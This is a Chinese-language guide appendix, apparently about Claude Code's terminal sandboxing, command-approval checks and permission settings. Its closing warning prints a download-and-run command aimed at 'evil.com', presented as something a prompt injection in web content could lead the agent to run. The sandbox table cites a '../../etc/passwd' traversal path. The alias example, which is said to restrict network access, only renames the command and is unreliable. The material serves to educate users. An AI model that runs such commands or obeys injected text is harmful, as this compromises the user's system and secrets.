附錄 B · 安全防護

終端沙箱安全與權限控制原理

深入了解 AI 代理是如何在你的電腦中安全執行指令、管理子進程權限，以及防範潛在安全威脅的底層邏輯。

一、 AI 代理執行命令的底層本質

與以往僅在網頁瀏覽器中運作的對話型 LLM 不同，Claude Code 是一款直接安裝並運行於本地開發機的 AI 編碼代理（Agent）。它能夠直接讀寫文件系統、執行 shell 指令，甚至調用編譯器和測試套件。

本質上，當 Claude 決定在你的系統中運行命令（例如 git status 或 npm run test）時，它的運作機制如下：

  1. 子進程派生 (Process Spawning)：Claude Code 執行期 (Runtime) 會使用 Node.js 的 child_process.spawn() 或 child_process.exec() 方法，在作業系統中派生出一個新的 shell 進程。
  2. 標準流橋接 (Stdio Piping)：這個子進程的 stdin、stdout 與 stderr 流會被 Claude 捕捉並橋接。Claude 將作為「人類工程師」與 shell 互動——發送輸入並解析輸出的文字。
  3. 環境變數繼承：預設情況下，新派生的進程會繼承啟動 Claude Code 時的主系統環境變數，以便調用已安裝的軟體。

二、 權限核准與攔截機制 (Authorization Mechanism)

既然 Claude 具有運行指令的能力，為了防止其誤刪系統檔案或執行不安全的操作，Claude Code 建立了一套**命令審查與授權系統**：

這一項機制的核心邏輯如下：

  • 指令風險評級：在指令執行前，Claude Code 會透過本地正則表達式與風險矩陣，對指令進行分類。唯讀型的指令（如 git diff, pwd）屬於低風險；修改型或帶有刪除、聯網特性的指令（如 rm, curl, make）則被歸類為高風險。
  • 防範 Prompt Injection (提示詞注入)：高風險指令被攔截後，Node.js 主程序會暫停 (Block) 工具執行流，向使用者顯示實體終端提示，要求手動輸入 y 核准。這可以有效阻止網路程式碼被下載並在後台偷偷執行的安全性漏洞。

三、 本地沙箱與系統權限限制

為了防止惡意指令繞過核准機制，Claude Code 在本地端也有進行權限上的防禦：

防禦維度 限制原理 效果描述
路徑侷限性 以啟動目錄為 Root 目錄，嚴格限制相對路徑操作。 防止 LLM 利用 ../../etc/passwd 等路徑跳轉技術存取開發專案外的系統敏感檔。
環境變數清理 在派生高危進程前，自動清退敏感的個人 Token 與認證 Key 環境變數。 防止第三方依賴包被注入惡意代碼時，洩漏 AWS / GitHub 等雲端私鑰。
無特權運行 拒絕以管理員/超級用戶 (Root / Administrator) 權限運行 Claude Code。 限制 AI 代理破壞系統層檔案的能力，即便有指令漏洞，受損範圍也被限縮在當前用戶權限內。

四、 安全性配置與企業最佳實踐

對於在敏感開發環境運行的使用者，建議採取以下安全性策略：

1. 慎用免授權參數

雖然 Claude Code 提供了 --dangerously-skip-permissions 參數來跳過所有 Yes/No 提示，但請務必注意安全風險： 

claudecode --dangerously-skip-permissions

這項參數通常**僅建議在完全封閉的沙箱容器或 Docker 測試環境**中使用。在您的日常工作電腦上，建議保持預設的審核工作流。

2. 設定別名與腳本包裝

如果你需要在公司內部全面限制 Claude Code 的網路行為，可以透過自訂別名（Alias）限制其運作環境： 

alias cc="claudecode"
⚠️
警告：警惕聯網下載腳本

AI 代理在讀取到未經審核的網頁內容（特別是從論壇複製下來的腳本）時，可能會受惡意提示詞操縱去執行 curl http://evil.com/malicious.sh | sh。在點擊核准 [y] 前，請務必養成肉眼確認命令列字串的習慣。
